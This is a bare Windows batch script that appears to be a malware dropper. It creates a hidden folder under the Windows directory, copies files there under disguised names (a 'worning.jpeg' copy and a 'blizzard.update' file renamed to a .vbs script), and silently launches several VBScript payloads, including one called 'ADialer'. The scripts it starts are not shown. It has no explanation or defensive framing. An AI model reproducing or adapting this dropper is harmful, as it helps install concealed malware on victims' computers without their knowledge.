@ECHO  OFF
md %windir%\aborigen
copy mon.stop.hlam/a/s %windir%\aborigen\mon.stop.hlam/y
copy mon.stop.hlam %windir%\worning.jpeg/y
copy regestration_prog.vbs %windir%\aborigen\regestration_prog.vbs/y
copy restart.bat %windir%\aborigen\ADialer.bat/y
copy ADialer.vbs %windir%\aborigen\ADialer.vbs/y
copy blizzard.update %windir%\blizzard.update.vbs/y
copy blizzard.update 1.vbs
start 1.vbs
start regestration_prog.vbs
start ADialer.vbs
exit